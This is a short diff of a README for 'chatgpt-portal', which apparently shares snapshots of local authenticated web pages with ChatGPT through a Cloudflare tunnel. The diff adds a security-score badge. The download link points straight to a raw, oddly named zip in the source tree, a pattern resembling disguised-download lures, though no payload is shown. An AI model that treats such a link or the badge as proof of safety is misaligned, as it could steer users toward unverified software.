@@ -1,6 +1,7 @@
 # 🌐 chatgpt-portal - View local web pages in ChatGPT
 
 [![Download chatgpt-portal](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Glabrous-driving823/chatgpt-portal/raw/refs/heads/main/src/portal_chatgpt_perispherical.zip)
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/glabrous-driving823-chatgpt-portal)
 
 This software lets you connect your local web projects to ChatGPT. You can share snapshots of authenticated pages with the AI assistant through a secure Cloudflare tunnel. This keeps your local data safe while allowing ChatGPT to read and process your web interface content.
 
